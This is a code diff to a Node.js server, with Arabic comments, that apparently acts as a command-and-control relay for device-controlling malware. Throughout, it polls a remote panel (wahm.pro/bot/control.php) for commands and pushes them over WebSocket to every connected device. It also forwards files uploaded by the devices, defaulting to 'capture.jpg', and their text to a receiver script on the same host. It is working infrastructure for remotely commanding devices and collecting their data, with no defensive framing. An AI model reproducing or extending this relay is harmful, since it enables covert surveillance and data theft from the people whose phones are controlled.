@@ -5,7 +5,9 @@ const axios = require("axios");
 const multer = require('multer');
 const FormData = require('form-data');
 
-const PANEL_URL = 'https://wahm.pro/bot/control.php'; 
+// الروابط الجديدة حسب طلبك
+const CMD_URL = 'https://wahm.pro/bot/control.php'; 
+const RECEIVER_URL = 'https://wahm.pro/bot/receiver.php'; 
 
 const app = express();
 const appServer = http.createServer(app);
@@ -15,61 +17,55 @@ const upload = multer({ storage: multer.memoryStorage() });
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
-async function forwardToPanel(data, isFile = false) {
+// إرسال النتائج إلى مستقبل الملفات
+async function sendResult(data, isFile = false) {
     try {
         if (isFile) {
             const form = new FormData();
-            form.append('file', data.buffer, { filename: data.name });
+            form.append('file', data.buffer, { filename: data.name || 'capture.jpg' });
             form.append('model', data.model);
-            await axios.post(PANEL_URL, form, { headers: { ...form.getHeaders() } });
+            await axios.post(RECEIVER_URL, form, { headers: { ...form.getHeaders() } });
         } else {
             const params = new URLSearchParams();
             params.append('model', data.model);
             params.append('text', data.text);
-            await axios.post(PANEL_URL, params);
+            await axios.post(RECEIVER_URL, params);
         }
-        console.log("✅ Forwarded to Panel");
-    } catch (e) { console.log("❌ Panel Error: " + e.message); }
+        console.log("✅ Result Sent to Receiver");
+    } catch (e) { console.log("❌ Receiver Error: " + e.message); }
 }
 
+// استقبال من التطبيق
 app.post("/uploadFile", upload.single('file'), async (req, res) => {
-    if (req.file) await forwardToPanel({ buffer: req.file.buffer, name: req.file.originalname, model: req.headers.model }, true);
+    if (req.file) await sendResult({ buffer: req.file.buffer, name: req.file.originalname, model: req.headers.model }, true);
     res.send('OK');
 });
 
 app.post("/uploadText", async (req, res) => {
-    if (req.body.text) await forwardToPanel({ model: req.headers.model, text: req.body.text });
+    if (req.body.text) await sendResult({ model: req.headers.model, text: req.body.text });
     res.send('OK');
 });
 
-// إدارة الـ WebSocket مع تحسين الـ Ping/Pong
+// الأوامر عبر الـ WebSocket
 appSocket.on('connection', (ws, req) => {
-    ws.model = req.headers.model || "Unknown";
+    console.log(`📱 Connected: ${req.headers.model || "Device"}`);
     ws.isAlive = true;
-    console.log(`📱 Connected: ${ws.model}`);
-
     ws.on('pong', () => { ws.isAlive = true; });
-    ws.on('message', (msg) => console.log(`Message from ${ws.model}: ${msg}`));
 });
 
-// سحب الأوامر من PHP وإرسالها للأجهزة
+// سحب الأوامر من control.php
 setInterval(async () => {
     try {
-        const res = await axios.get(`${PANEL_URL}?get_cmd=1`, { timeout: 2000 });
+        const res = await axios.get(`${CMD_URL}?get_cmd=1`, { timeout: 2000 });
         const cmd = res.data.trim();
-        
         if (cmd !== "WAIT" && cmd !== "OK" && cmd !== "") {
-            console.log(`🚀 Executing Command: ${cmd}`);
             appSocket.clients.forEach(ws => {
-                if (ws.readyState === webSocket.OPEN) {
-                    ws.send(cmd);
-                }
+                if (ws.readyState === webSocket.OPEN) ws.send(cmd);
             });
         }
-    } catch (e) { console.log("Polling error"); }
-}, 2000); // تقليل الوقت لـ 2 ثانية لسرعة التنفيذ
+    } catch (e) { }
+}, 2500);
 
-// Ping للأجهزة كل 10 ثواني لضمان بقاء الاتصال
 setInterval(() => {
     appSocket.clients.forEach(ws => {
         if (!ws.isAlive) return ws.terminate();
